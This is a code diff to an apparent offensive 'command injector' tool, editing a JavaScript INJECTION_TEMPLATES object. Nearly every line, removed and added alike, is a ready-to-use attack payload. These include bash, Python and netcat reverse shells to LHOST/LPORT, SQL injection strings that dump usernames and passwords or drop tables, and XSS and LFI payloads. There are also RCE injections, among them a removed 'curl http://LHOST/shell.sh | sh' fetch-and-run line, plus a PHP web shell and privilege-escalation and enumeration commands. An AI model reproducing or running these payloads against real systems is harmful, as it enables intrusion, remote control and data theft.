@@ -2785,21 +2785,21 @@ MASTER_TEMPLATE = """
         // ==================== COMMAND INJECTOR FUNCTIONS ====================
         
         const INJECTION_TEMPLATES = {
-            revshell: "# Bash Reverse Shell\\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\\n\\n# Python Reverse Shell\\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\\n\\n# Netcat Reverse Shell\\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
+            revshell: "# Bash Reverse Shell\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n# Python Reverse Shell\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Netcat Reverse Shell\nnc LHOST LPORT -e /bin/sh",
             
-            sqli: "-- Basic SQL Injection Payloads\\n' OR '1'='1\\n' OR '1'='1' --\\n' OR '1'='1' /*\\n\" OR \"1\"=\"1\\n' UNION SELECT NULL--\\n' UNION SELECT NULL,NULL--\\n' UNION SELECT username,password FROM users--\\n1' AND (SELECT COUNT(*) FROM users) > 0--\\n'; DROP TABLE users;--",
+            sqli: "-- SQL Injection Payloads\n' OR '1'='1\n' OR '1'='1' --\n\" OR \"1\"=\"1\n' UNION SELECT NULL--\n' UNION SELECT username,password FROM users--",
 
-            xss: "<!-- XSS Payloads -->\\n<script>alert('XSS')</script>\\n<img src=x onerror=alert('XSS')>\\n<svg onload=alert('XSS')>\\n<body onload=alert('XSS')>\\njavascript:alert('XSS')\\n<iframe src=\"javascript:alert('XSS')\">\\n<input onfocus=alert('XSS') autofocus>",
+            xss: "<!-- XSS Payloads -->\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>",
 
-            lfi: "# Local File Inclusion Payloads\\n../../../etc/passwd\\n....//....//....//etc/passwd\\n..%252f..%252f..%252fetc/passwd\\n/proc/self/environ\\n/var/log/apache2/access.log\\nphp://filter/convert.base64-encode/resource=index.php\\nphp://input",
+            lfi: "# LFI Payloads\n../../../etc/passwd\n....//....//....//etc/passwd\n/proc/self/environ\nphp://filter/convert.base64-encode/resource=index.php",
 
-            rce: "# Remote Code Execution Payloads\\n; id\\n| id\\n$(id)\\n; cat /etc/passwd\\n| cat /etc/passwd\\n; wget http://LHOST/shell.sh | bash\\n; curl http://LHOST/shell.sh | sh",
+            rce: "# RCE Payloads\n; id\n| id\n$(id)\n; cat /etc/passwd",
 
-            webshell: "<?php\\n// Simple PHP Web Shell\\nif(isset($_REQUEST['cmd'])){\\n    echo \"<pre>\";\\n    $cmd = ($_REQUEST['cmd']);\\n    system($cmd);\\n    echo \"</pre>\";\\n    die;\\n}\\n?>",
+            webshell: "<?php system($_GET['cmd']); ?>",
 
-            privesc: "# Linux Privilege Escalation Commands\\nwhoami && id\\nuname -a\\ncat /etc/passwd\\nsudo -l\\nfind / -perm -4000 2>/dev/null\\nfind / -writable -type d 2>/dev/null\\ngetcap -r / 2>/dev/null\\nps aux | grep root\\ncat /etc/crontab",
+            privesc: "# PrivEsc Commands\nwhoami && id\nuname -a\nsudo -l\nfind / -perm -4000 2>/dev/null",
 
-            enumeration: "# System Enumeration\\nhostname && whoami && id\\nuname -a\\ncat /etc/os-release\\nip a\\nnetstat -tulpn\\nps aux\\nenv\\ncat /etc/passwd\\ncat /etc/hosts\\nls -la /home"
+            enumeration: "# Enumeration\nhostname && whoami && id\nuname -a\nip a\nnetstat -tulpn\nps aux"
         };
         
         function loadTemplate(type) {
